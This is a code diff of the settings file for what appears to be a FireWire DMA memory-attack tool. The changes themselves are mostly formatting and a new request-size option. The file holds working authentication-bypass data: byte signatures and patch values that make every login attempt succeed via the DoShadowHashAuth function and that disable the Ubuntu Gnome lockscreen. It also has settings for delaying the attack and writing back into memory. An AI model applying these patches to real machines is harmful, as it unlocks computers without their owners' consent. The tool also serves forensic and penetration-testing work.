@@ -1,10 +1,10 @@
 '''
 Created on Sep 6, 2011
 
-@author: Carsten Maartmann-Moe
+@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
 '''
 #===============================================================================
-# Configuration file with signatures
+# Configuration file with signatures - not in use at the moment
 #===============================================================================
 configfile = 'config.json'
 
@@ -21,21 +21,23 @@ OUICONF = 'ftwautopwn/oui.txt'  # FireWire OUI database
 #===============================================================================
 # Global variables/defaults/settings
 #===============================================================================
-verbose = False         # Not verbose
-fw_delay = 15           # 15 seconds delay before attacking
-filemode = False        # Search in file instead of FW DMA
-dry_run = False         # No write-back into memory
-target = False          # No target set
-filename = ''           # No filename set per default
-buflen = 15             # Buffer length for checking if we get data
-memsize = 4 * GiB       # 4 GiB, FW max
-success = True          # Optimistic-by-nature setting
-encoding = None         # System encoding
-vectorsize = 128        # Read vector size
-memdump = False         # Memory dump mode off
-dumpstart = 0x00000000  # Default memory dump start address
-dumpsize = False        # Not set by default
-interactive = False     # Interactive mode off
+verbose = False                 # Not verbose
+fw_delay = 15                   # 15 seconds delay before attacking
+filemode = False                # Search in file instead of FW DMA
+dry_run = False                 # No write-back into memory
+target = False                  # No target set
+filename = ''                   # No filename set per default
+buflen = 15                     # Buffer length for checking if we get data
+memsize = 4 * GiB               # 4 GiB, FW max
+success = True                  # Optimistic-by-nature setting
+encoding = None                 # System encoding
+vectorsize = 128                # Read vector size
+memdump = False                 # Memory dump mode off
+dumpstart = 0x00000000          # Default memory dump start address
+dumpsize = False                # Not set by default
+interactive = False             # Interactive mode off
+max_request_size = PAGESIZE     # By default the max request size is the PSZ
+
 
 #===============================================================================
 # Targets are collected in a list of dicts using the following syntax:
@@ -150,7 +152,7 @@ targets=[{'OS': 'Windows 7',
           'architectures': ['x64'],
           'name': 'DoShadowHashAuth technique',
           'notes': 'Short circuits the password validation function, causing all login attempts to succeed.',
-          'signatures': [{'offsets': 0x7cf,
+          'signatures': [{'offsets': [0x7cf],
                           'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
                                       'internaloffset': 0x00,
                                       'patch': 0x41bf0000000048c78588}]}]},
@@ -159,7 +161,7 @@ targets=[{'OS': 'Windows 7',
           'architectures': ['x32'],
           'name': 'Gnome lockscreen unlock',
           'notes': 'Disables Ubuntu lockscreen.',
-          'signatures': [{'offsets': 0xd3f,
+          'signatures': [{'offsets': [0xd3f],
                           'chunks': [{'chunk': 0xe8cc61000085c00f85e4000000c74424100e460508c744240c14460508c744240827010000c74424042d,
                                       'internaloffset': 0x00,
                                       'patch': 0xb80100000085}]}]}]
